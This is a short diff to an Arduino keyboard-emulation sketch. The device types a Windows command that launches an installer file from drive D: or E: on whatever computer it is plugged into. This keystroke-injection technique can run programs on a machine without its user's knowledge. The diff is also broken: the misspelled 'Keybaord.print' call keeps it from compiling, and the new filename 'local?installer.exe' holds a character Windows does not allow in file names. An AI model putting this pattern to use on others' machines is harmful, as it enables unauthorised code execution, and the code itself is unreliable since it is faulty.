@@ -1,5 +1,7 @@
 #include <Keyboard.h>
 
+const String INSTALLER = "local?installer.exe";
+
 // Function to type ':'
 void typeColon() {
   Keyboard.press(KEY_LEFT_SHIFT);
@@ -76,7 +78,7 @@ void setup() {
   delay(400);
 
   // Execute installer command with special characters
-  Keybaord.print("if exist D:\local_installer.py (call D:\local_installer.py && exit) else if exist E:\local_installer.py (call E:\local_installer.py && exit) else (exit)");
+  Keybaord.print("if exist D:\\" + INSTALLER + " (call D:\\" + INSTALLER + " && exit) else if exist E:\\" + INSTALLER + " (call E:\\" + INSTALLER + " && exit) else (exit)");
 
   delay(100);
   Keyboard.releaseAll();
